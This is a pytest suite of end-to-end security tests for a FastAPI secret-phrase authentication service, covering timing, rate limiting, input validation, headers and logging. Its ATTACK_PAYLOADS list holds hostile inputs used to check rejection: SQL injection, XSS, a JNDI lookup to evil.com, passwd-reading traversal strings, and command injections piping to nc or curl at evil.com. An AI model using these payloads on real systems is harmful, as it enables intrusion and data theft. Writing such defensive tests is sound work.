"""
End-to-end security tests for the secret phrase authentication system.

This module tests all security measures including timing attack resistance,
rate limiting, memory protection, input validation, and security headers
with real implementations and no mocking.
"""

import pytest
import asyncio
import time
import uuid
import statistics
from datetime import datetime, timedelta
from typing import Dict, Any, List, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed

from fastapi.testclient import TestClient
from sqlalchemy import create_engine, text
from sqlalchemy.orm import sessionmaker

from app.main import app
from app.db.session import get_db
from app.models.user import User
from app.models.secret_tag_opaque import SecretTag, SecurityAuditLog
from app.crypto.opaque_keys import derive_opaque_keys_from_phrase
from app.services.opaque_service import EnhancedOpaqueService
from app.services.audit_service import SecurityAuditService
from app.security.constant_time import ConstantTimeOperations
from app.security.rate_limiter import RateLimitStrategy, AttackDetector
from app.security.memory_protection import SecureMemoryManager
from app.security.input_validator import InputValidator, SQLInjectionDetector, XSSProtector
from app.security.security_headers import SecurityHeadersManager
from app.utils.secure_utils import SecureTokenGenerator, SecureHasher

# Test configuration
TEST_DATABASE_URL = "postgresql://postgres:password@localhost:5432/vibes_test"
TEST_USER_EMAIL = "security_test@example.com"
TEST_USER_PASSWORD = "SecurityTestPassword123!"

# Security test data
ATTACK_PAYLOADS = {
    "sql_injection": [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        "'; INSERT INTO users (email) VALUES ('hacked@evil.com'); --",
        "' OR 1=1 --",
        "admin'--",
        "' OR 'x'='x",
        "'; DELETE FROM secret_tags; --",
    ],
    "xss": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<<SCRIPT>alert('XSS')<</SCRIPT>",
    ],
    "injection": [
        "${jndi:ldap://evil.com/attack}",
        "{{7*7}}",
        "<%=7*7%>",
        "${7*7}",
        "#{7*7}",
        "<%= system('cat /etc/passwd') %>",
        "{{config.items()}}",
        "${@print(system('whoami'))}",
    ],
    "path_traversal": [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc//passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    ],
    "command_injection": [
        "; ls -la",
        "| whoami",
        "& ping evil.com",
        "`id`",
        "$(whoami)",
        "; cat /etc/passwd",
        "| nc evil.com 1234",
        "&& curl evil.com/steal",
    ]
}

# Timing attack test phrases
TIMING_TEST_PHRASES = [
    "The quick brown fox jumps over the lazy dog",
    "Wrong phrase that should fail authentication",
    "Another incorrect phrase for timing tests",
    "This is not the correct secret phrase",
    "Completely different phrase content",
]

# Rate limiting test parameters
RATE_LIMIT_TESTS = {
    "registration": {"endpoint": "/api/opaque/register", "limit": 10},
    "authentication": {"endpoint": "/api/opaque/auth/init", "limit": 20},
    "login": {"endpoint": "/api/auth/login", "limit": 5},
    "password_reset": {"endpoint": "/api/auth/reset-password", "limit": 3},
}


class TestSecurityMeasures:
    """Comprehensive end-to-end security tests."""

    @pytest.fixture(autouse=True)
    def setup_method(self):
        """Set up test environment before each test."""
        self.client = TestClient(app)
        self.token_generator = SecureTokenGenerator()
        self.hasher = SecureHasher()
        self.constant_time = ConstantTimeOperations()
        self.memory_manager = SecureMemoryManager()
        self.input_validator = InputValidator()
        self.sql_detector = SQLInjectionDetector()
        self.xss_protector = XSSProtector()
        self.security_headers = SecurityHeadersManager()
        
        # Create test database session
        self.engine = create_engine(TEST_DATABASE_URL)
        SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=self.engine)
        self.db = SessionLocal()
        
        # Override database dependency
        def override_get_db():
            try:
                yield self.db
            finally:
                self.db.close()
        
        app.dependency_overrides[get_db] = override_get_db
        
        # Create test user
        self.test_user = self._create_test_user()
        self.user_id = self.test_user.id
        
        # Initialize services
        self.opaque_service = EnhancedOpaqueService(self.db)
        self.audit_service = SecurityAuditService()
        
        # Create test secret tag
        self.test_secret_tag = self._create_test_secret_tag()

    def teardown_method(self):
        """Clean up after each test."""
        # Clean up test data
        self._cleanup_test_data()
        
        # Close database connections
        self.db.close()
        
        # Clear dependency overrides
        app.dependency_overrides.clear()
        
        # Clear secure memory
        self.memory_manager.clear_all()

    def _create_test_user(self) -> User:
        """Create a test user for security tests."""
        existing_user = self.db.query(User).filter(User.email == TEST_USER_EMAIL).first()
        if existing_user:
            return existing_user
        
        hashed_password = self.hasher.hash_password(TEST_USER_PASSWORD)
        user = User(
            id=uuid.uuid4(),
            email=TEST_USER_EMAIL,
            hashed_password=hashed_password,
            is_active=True,
            created_at=datetime.utcnow()
        )
        self.db.add(user)
        self.db.commit()
        self.db.refresh(user)
        return user

    def _create_test_secret_tag(self) -> SecretTag:
        """Create a test secret tag for security tests."""
        phrase = TIMING_TEST_PHRASES[0]
        opaque_keys = derive_opaque_keys_from_phrase(phrase)
        
        secret_tag = SecretTag(
            tag_id=opaque_keys.tag_id,
            user_id=self.user_id,
            salt=opaque_keys.salt,
            verifier_kv=b"test_verifier",
            opaque_envelope=b"test_envelope",
            tag_name="Security Test Tag",
            color_code="#FF0000",
            created_at=datetime.utcnow(),
            updated_at=datetime.utcnow()
        )
        
        self.db.add(secret_tag)
        self.db.commit()
        self.db.refresh(secret_tag)
        return secret_tag

    def _cleanup_test_data(self):
        """Clean up test data from database."""
        try:
            self.db.query(SecurityAuditLog).filter(
                SecurityAuditLog.user_id == str(self.user_id)
            ).delete()
            
            self.db.query(SecretTag).filter(
                SecretTag.user_id == self.user_id
            ).delete()
            
            self.db.query(User).filter(
                User.id == self.user_id
            ).delete()
            
            self.db.commit()
        except Exception as e:
            self.db.rollback()
            print(f"Cleanup error: {e}")

    def _authenticate_user(self) -> str:
        """Authenticate test user and return access token."""
        response = self.client.post(
            "/api/auth/login",
            data={
                "username": TEST_USER_EMAIL,
                "password": TEST_USER_PASSWORD
            }
        )
        assert response.status_code == 200
        return response.json()["access_token"]

    @pytest.mark.asyncio
    async def test_timing_attack_resistance(self):
        """Test that operations are resistant to timing attacks."""
        access_token = self._authenticate_user()
        headers = {"Authorization": f"Bearer {access_token}"}
        
        # Test authentication timing consistency
        tag_id = self.test_secret_tag.tag_id.hex()
        correct_phrase = TIMING_TEST_PHRASES[0]
        wrong_phrases = TIMING_TEST_PHRASES[1:]
        
        # Measure timing for correct phrase
        correct_times = []
        for _ in range(20):  # Multiple measurements for statistical analysis
            start_time = time.time()
            response = self.client.post(
                "/api/opaque/auth/init",
                json={
                    "phrase": correct_phrase,
                    "tag_id": tag_id
                },
                headers=headers
            )
            end_time = time.time()
            correct_times.append(end_time - start_time)
            
            # Verify response
            assert response.status_code == 200
        
        # Measure timing for wrong phrases
        wrong_times = []
        for wrong_phrase in wrong_phrases:
            for _ in range(5):  # Multiple measurements per wrong phrase
                start_time = time.time()
                response = self.client.post(
                    "/api/opaque/auth/init",
                    json={
                        "phrase": wrong_phrase,
                        "tag_id": tag_id
                    },
                    headers=headers
                )
                end_time = time.time()
                wrong_times.append(end_time - start_time)
                
                # Verify response
                assert response.status_code == 401
        
        # Statistical analysis
        correct_avg = statistics.mean(correct_times)
        wrong_avg = statistics.mean(wrong_times)
        correct_std = statistics.stdev(correct_times)
        wrong_std = statistics.stdev(wrong_times)
        
        # Timing should be similar (difference within 2 standard deviations)
        timing_difference = abs(correct_avg - wrong_avg)
        combined_std = (correct_std + wrong_std) / 2
        
        assert timing_difference <= 2 * combined_std, \
            f"Timing attack vulnerability detected: {timing_difference:.3f}s difference"
        
        # Log timing analysis
        print(f"Correct phrase timing: {correct_avg:.3f}s ± {correct_std:.3f}s")
        print(f"Wrong phrase timing: {wrong_avg:.3f}s ± {wrong_std:.3f}s")
        print(f"Timing difference: {timing_difference:.3f}s")

    @pytest.mark.asyncio
    async def test_rate_limiting_effectiveness(self):
        """Test rate limiting effectiveness against various attack patterns."""
        access_token = self._authenticate_user()
        headers = {"Authorization": f"Bearer {access_token}"}
        
        # Test authentication rate limiting
        tag_id = self.test_secret_tag.tag_id.hex()
        wrong_phrase = TIMING_TEST_PHRASES[1]
        
        # Send rapid authentication requests
        responses = []
        for i in range(30):  # Exceed rate limit
            response = self.client.post(
                "/api/opaque/auth/init",
                json={
                    "phrase": wrong_phrase,
                    "tag_id": tag_id
                },
                headers=headers
            )
            responses.append(response)
        
        # Analyze responses
        auth_failures = [r for r in responses if r.status_code == 401]
        rate_limited = [r for r in responses if r.status_code == 429]
        
        # Should have rate limiting triggered
        assert len(rate_limited) > 0, "Rate limiting should be triggered"
        
        # Should still have some auth failures before rate limiting
        assert len(auth_failures) > 0, "Some auth failures should occur"
        
        # Total rate limited should be significant
        rate_limit_percentage = len(rate_limited) / len(responses)
        assert rate_limit_percentage > 0.3, f"Rate limiting too weak: {rate_limit_percentage:.1%}"

    @pytest.mark.asyncio
    async def test_distributed_rate_limiting(self):
        """Test distributed rate limiting across multiple clients."""
        access_token = self._authenticate_user()
        headers = {"Authorization": f"Bearer {access_token}"}
        
        # Simulate multiple clients
        async def simulate_client_requests(client_id: int):
            responses = []
            for i in range(10):
                response = self.client.post(
                    "/api/opaque/auth/init",
                    json={
                        "phrase": TIMING_TEST_PHRASES[1],
                        "tag_id": self.test_secret_tag.tag_id.hex()
                    },
                    headers=headers
                )
                responses.append(response)
            return responses
        
        # Run concurrent client simulations
        tasks = [simulate_client_requests(i) for i in range(5)]
        all_responses = await asyncio.gather(*tasks)
        
        # Flatten responses
        flat_responses = [r for client_responses in all_responses for r in client_responses]
        
        # Analyze distributed rate limiting
        rate_limited = [r for r in flat_responses if r.status_code == 429]
        
        # Should enforce rate limiting across all clients
        assert len(rate_limited) > 0, "Distributed rate limiting should be triggered"

    @pytest.mark.asyncio
    async def test_adaptive_rate_limiting(self):
        """Test adaptive rate limiting that adjusts based on attack patterns."""
        access_token = self._authenticate_user()
        headers = {"Authorization": f"Bearer {access_token}"}
        
        # Normal usage pattern
        normal_responses = []
        for i in range(5):
            response = self.client.post(
                "/api/opaque/auth/init",
                json={
                    "phrase": TIMING_TEST_PHRASES[0],  # Correct phrase
                    "tag_id": self.test_secret_tag.tag_id.hex()
                },
                headers=headers
            )
            normal_responses.append(response)
            time.sleep(0.1)  # Normal delay between requests
        
        # Attack pattern
        attack_responses = []
        for i in range(20):
            response = self.client.post(
                "/api/opaque/auth/init",
                json={
                    "phrase": TIMING_TEST_PHRASES[1],  # Wrong phrase
                    "tag_id": self.test_secret_tag.tag_id.hex()
                },
                headers=headers
            )
            attack_responses.append(response)
            # No delay - rapid attack
        
        # Analyze adaptive behavior
        normal_success = [r for r in normal_responses if r.status_code == 200]
        attack_rate_limited = [r for r in attack_responses if r.status_code == 429]
        
        # Normal requests should mostly succeed
        assert len(normal_success) >= 3, "Normal requests should succeed"
        
        # Attack requests should be rate limited
        assert len(attack_rate_limited) > 0, "Attack requests should be rate limited"

    @pytest.mark.parametrize("payload_type", ["sql_injection", "xss", "injection", "path_traversal", "command_injection"])
    @pytest.mark.asyncio
    async def test_input_validation_security(self, payload_type: str):
        """Test input validation against various attack payloads."""
        access_token = self._authenticate_user()
        headers = {"Authorization": f"Bearer {access_token}"}
        
        attack_payloads = ATTACK_PAYLOADS[payload_type]
        
        # Test registration endpoint
        for payload in attack_payloads:
            # Test in phrase field
            response = self.client.post(
                "/api/opaque/register",
                json={
                    "phrase": payload,
                    "tag_name": "Test Tag",
                    "color_code": "#FF0000",
                    "tag_id": "0" * 32,
                    "salt": "0" * 32,
                    "verification_key": "0" * 64
                },
                headers=headers
            )
            
            # Should be rejected (400 Bad Request)
            assert response.status_code == 400, f"Payload not blocked: {payload}"
            
            # Test in tag_name field
            response = self.client.post(
                "/api/opaque/register",
                json={
                    "phrase": "Valid phrase for testing",
                    "tag_name": payload,
                    "color_code": "#FF0000",
                    "tag_id": "0" * 32,
                    "salt": "0" * 32,
                    "verification_key": "0" * 64
                },
                headers=headers
            )
            
            # Should be rejected (400 Bad Request)
            assert response.status_code == 400, f"Payload not blocked in tag_name: {payload}"

    @pytest.mark.asyncio
    async def test_sql_injection_protection(self):
        """Test specific SQL injection protection."""
        access_token = self._authenticate_user()
        headers = {"Authorization": f"Bearer {access_token}"}
        
        # Test various SQL injection patterns
        sql_payloads = ATTACK_PAYLOADS["sql_injection"]
        
        for payload in sql_payloads:
            # Test in authentication
            response = self.client.post(
                "/api/opaque/auth/init",
                json={
                    "phrase": payload,
                    "tag_id": self.test_secret_tag.tag_id.hex()
                },
                headers=headers
            )
            
            # Should be rejected or handle safely
            assert response.status_code in [400, 401], f"SQL injection not blocked: {payload}"
            
            # Verify database integrity
            user_count = self.db.query(User).count()
            assert user_count == 1, "Database integrity compromised"
            
            secret_tag_count = self.db.query(SecretTag).count()
            assert secret_tag_count == 1, "Secret tags compromised"

    @pytest.mark.asyncio
    async def test_xss_protection(self):
        """Test Cross-Site Scripting (XSS) protection."""
        access_token = self._authenticate_user()
        headers = {"Authorization": f"Bearer {access_token}"}
        
        xss_payloads = ATTACK_PAYLOADS["xss"]
        
        for payload in xss_payloads:
            # Test in journal entry
            response = self.client.post(
                "/api/journals/entries",
                json={
                    "content": payload,
                    "entry_type": "text"
                },
                headers=headers
            )
            
            # Should be sanitized or rejected
            if response.status_code == 200:
                # If accepted, content should be sanitized
                content = response.json().get("content", "")
                assert "<script>" not in content, f"XSS not sanitized: {payload}"
                assert "javascript:" not in content, f"XSS not sanitized: {payload}"
                assert "onerror=" not in content, f"XSS not sanitized: {payload}"
            else:
                # Or should be rejected
                assert response.status_code == 400, f"XSS not properly handled: {payload}"

    @pytest.mark.asyncio
    async def test_memory_protection(self):
        """Test memory protection mechanisms."""
        access_token = self._authenticate_user()
        headers = {"Authorization": f"Bearer {access_token}"}
        
        # Monitor memory allocations
        initial_allocations = len(self.memory_manager.tracked_allocations)
        
        # Perform operations that handle sensitive data
        sensitive_operations = [
            lambda: self.client.post(
                "/api/opaque/auth/init",
                json={
                    "phrase": TIMING_TEST_PHRASES[0],
                    "tag_id": self.test_secret_tag.tag_id.hex()
                },
                headers=headers
            ),
            lambda: self.client.post(
                "/api/opaque/register",
                json={
                    "phrase": "New test phrase for memory testing",
                    "tag_name": "Memory Test Tag",
                    "color_code": "#00FF00",
                    "tag_id": "1" * 32,
                    "salt": "1" * 32,
                    "verification_key": "1" * 64
                },
                headers=headers
            )
        ]
        
        for operation in sensitive_operations:
            response = operation()
            # Memory should be properly managed
            current_allocations = len(self.memory_manager.tracked_allocations)
            
            # Should not have excessive memory leaks
            allocation_growth = current_allocations - initial_allocations
            assert allocation_growth < 100, f"Memory leak detected: {allocation_growth} allocations"

    @pytest.mark.asyncio
    async def test_security_headers(self):
        """Test security headers are properly set."""
        # Test various endpoints
        endpoints = [
            "/api/health",
            "/api/auth/login",
            "/api/opaque/register",
            "/api/journals/entries"
        ]
        
        for endpoint in endpoints:
            response = self.client.get(endpoint)
            
            # Check for security headers
            headers = response.headers
            
            # Content Security Policy
            assert "Content-Security-Policy" in headers or "content-security-policy" in headers, \
                f"CSP header missing for {endpoint}"
            
            # X-Frame-Options
            assert "X-Frame-Options" in headers or "x-frame-options" in headers, \
                f"X-Frame-Options header missing for {endpoint}"
            
            # X-Content-Type-Options
            assert "X-Content-Type-Options" in headers or "x-content-type-options" in headers, \
                f"X-Content-Type-Options header missing for {endpoint}"
            
            # X-XSS-Protection
            assert "X-XSS-Protection" in headers or "x-xss-protection" in headers, \
                f"X-XSS-Protection header missing for {endpoint}"

    @pytest.mark.asyncio
    async def test_csrf_protection(self):
        """Test CSRF protection mechanisms."""
        # Test without CSRF token
        response = self.client.post(
            "/api/auth/login",
            data={
                "username": TEST_USER_EMAIL,
                "password": TEST_USER_PASSWORD
            }
        )
        
        # Should still work for API endpoints (token-based auth)
        assert response.status_code == 200
        
        # Test with malicious referer
        malicious_headers = {
            "Referer": "https://evil.com/attack",
            "Origin": "https://evil.com"
        }
        
        response = self.client.post(
            "/api/auth/login",
            data={
                "username": TEST_USER_EMAIL,
                "password": TEST_USER_PASSWORD
            },
            headers=malicious_headers
        )
        
        # Should be rejected or handled safely
        # (Implementation depends on CSRF protection strategy)

    @pytest.mark.asyncio
    async def test_session_security(self):
        """Test session security mechanisms."""
        # Test session token security
        access_token = self._authenticate_user()
        
        # Token should be properly formatted JWT
        token_parts = access_token.split(".")
        assert len(token_parts) == 3, "Invalid JWT format"
        
        # Test session hijacking protection
        headers = {"Authorization": f"Bearer {access_token}"}
        
        # Normal request should work
        response = self.client.get("/api/health", headers=headers)
        assert response.status_code == 200
        
        # Test with modified token
        modified_token = access_token[:-5] + "XXXXX"
        modified_headers = {"Authorization": f"Bearer {modified_token}"}
        
        response = self.client.get("/api/health", headers=modified_headers)
        assert response.status_code == 401, "Modified token should be rejected"

    @pytest.mark.asyncio
    async def test_attack_detection_and_blocking(self):
        """Test attack detection and automatic blocking."""
        access_token = self._authenticate_user()
        headers = {"Authorization": f"Bearer {access_token}"}
        
        # Simulate brute force attack
        attack_responses = []
        for i in range(50):  # Sustained attack
            response = self.client.post(
                "/api/opaque/auth/init",
                json={
                    "phrase": TIMING_TEST_PHRASES[1],  # Wrong phrase
                    "tag_id": self.test_secret_tag.tag_id.hex()
                },
                headers=headers
            )
            attack_responses.append(response)
        
        # Should detect attack pattern and block
        blocked_responses = [r for r in attack_responses if r.status_code == 429]
        
        # Should have significant blocking
        block_percentage = len(blocked_responses) / len(attack_responses)
        assert block_percentage > 0.5, f"Attack detection too weak: {block_percentage:.1%}"
        
        # Check if IP is blocked
        response = self.client.get("/api/health", headers=headers)
        # Should still allow legitimate requests or show blocked status

    @pytest.mark.asyncio
    async def test_audit_logging_security(self):
        """Test that security events are properly logged."""
        access_token = self._authenticate_user()
        headers = {"Authorization": f"Bearer {access_token}"}
        
        # Get initial log count
        initial_count = self.db.query(SecurityAuditLog).filter(
            SecurityAuditLog.user_id == str(self.user_id)
        ).count()
        
        # Perform security-relevant operations
        security_operations = [
            # Failed authentication
            lambda: self.client.post(
                "/api/opaque/auth/init",
                json={
                    "phrase": TIMING_TEST_PHRASES[1],
                    "tag_id": self.test_secret_tag.tag_id.hex()
                },
                headers=headers
            ),
            # Successful authentication
            lambda: self.client.post(
                "/api/opaque/auth/init",
                json={
                    "phrase": TIMING_TEST_PHRASES[0],
                    "tag_id": self.test_secret_tag.tag_id.hex()
                },
                headers=headers
            ),
            # Input validation failure
            lambda: self.client.post(
                "/api/opaque/register",
                json={
                    "phrase": "'; DROP TABLE users; --",
                    "tag_name": "Test",
                    "color_code": "#FF0000",
                    "tag_id": "0" * 32,
                    "salt": "0" * 32,
                    "verification_key": "0" * 64
                },
                headers=headers
            )
        ]
        
        for operation in security_operations:
            operation()
        
        # Check that security events were logged
        final_count = self.db.query(SecurityAuditLog).filter(
            SecurityAuditLog.user_id == str(self.user_id)
        ).count()
        
        assert final_count > initial_count, "Security events should be logged"
        
        # Check log content
        recent_logs = self.db.query(SecurityAuditLog).filter(
            SecurityAuditLog.user_id == str(self.user_id),
            SecurityAuditLog.created_at > datetime.utcnow() - timedelta(minutes=1)
        ).all()
        
        assert len(recent_logs) > 0, "Recent security logs should exist"

    @pytest.mark.asyncio
    async def test_constant_time_operations(self):
        """Test that cryptographic operations are constant-time."""
        # Test constant-time string comparison
        test_strings = [
            ("hello", "hello"),
            ("hello", "world"),
            ("a" * 100, "a" * 100),
            ("a" * 100, "b" * 100),
            ("", ""),
            ("", "nonempty"),
        ]
        
        for str1, str2 in test_strings:
            # Measure timing
            times = []
            for _ in range(100):
                start = time.time()
                result = self.constant_time.compare_strings(str1, str2)
                end = time.time()
                times.append(end - start)
            
            # Timing should be consistent
            avg_time = statistics.mean(times)
            std_time = statistics.stdev(times) if len(times) > 1 else 0
            
            # Standard deviation should be small (consistent timing)
            assert std_time < avg_time * 0.5, f"Timing not constant for {str1} vs {str2}"

    @pytest.mark.asyncio
    async def test_security_configuration_validation(self):
        """Test that security configuration is properly validated."""
        # Test security headers configuration
        headers_config = self.security_headers.get_default_headers()
        
        # Should have proper CSP
        csp = headers_config.get("Content-Security-Policy", "")
        assert "default-src 'self'" in csp, "CSP should restrict default sources"
        
        # Should have HSTS
        hsts = headers_config.get("Strict-Transport-Security", "")
        assert "max-age=" in hsts, "HSTS should be configured"
        
        # Should have frame protection
        frame_options = headers_config.get("X-Frame-Options", "")
        assert frame_options in ["DENY", "SAMEORIGIN"], "Frame protection should be enabled"

    @pytest.mark.asyncio
    async def test_error_handling_security(self):
        """Test that error handling doesn't leak sensitive information."""
        access_token = self._authenticate_user()
        headers = {"Authorization": f"Bearer {access_token}"}
        
        # Test various error scenarios
        error_scenarios = [
            # Invalid JSON
            lambda: self.client.post(
                "/api/opaque/register",
                data="invalid json",
                headers=headers
            ),
            # Missing required fields
            lambda: self.client.post(
                "/api/opaque/register",
                json={},
                headers=headers
            ),
            # Invalid authentication
            lambda: self.client.post(
                "/api/opaque/auth/init",
                json={
                    "phrase": "test",
                    "tag_id": "nonexistent"
                },
                headers=headers
            ),
        ]
        
        for scenario in error_scenarios:
            response = scenario()
            
            # Should return appropriate error status
            assert response.status_code >= 400
            
            # Error messages should not leak sensitive information
            error_content = response.json()
            error_message = str(error_content)
            
            # Should not contain sensitive data
            sensitive_patterns = [
                "password", "secret", "key", "token", "salt", "verifier",
                "database", "sql", "query", "exception", "traceback"
            ]
            
            for pattern in sensitive_patterns:
                assert pattern not in error_message.lower(), \
                    f"Error message leaks sensitive info: {pattern}"

    @pytest.mark.asyncio
    async def test_concurrent_security_operations(self):
        """Test security measures under concurrent load."""
        access_token = self._authenticate_user()
        headers = {"Authorization": f"Bearer {access_token}"}
        
        # Concurrent authentication attempts
        async def auth_attempt():
            return self.client.post(
                "/api/opaque/auth/init",
                json={
                    "phrase": TIMING_TEST_PHRASES[1],  # Wrong phrase
                    "tag_id": self.test_secret_tag.tag_id.hex()
                },
                headers=headers
            )
        
        # Run concurrent operations
        tasks = [auth_attempt() for _ in range(20)]
        responses = await asyncio.gather(*tasks)
        
        # Analyze concurrent behavior
        status_codes = [r.status_code for r in responses]
        
        # Should have proper error handling
        assert all(code in [401, 429] for code in status_codes), \
            "Concurrent operations should be properly handled"
        
        # Should maintain rate limiting
        rate_limited = sum(1 for code in status_codes if code == 429)
        assert rate_limited > 0, "Rate limiting should work under concurrent load" 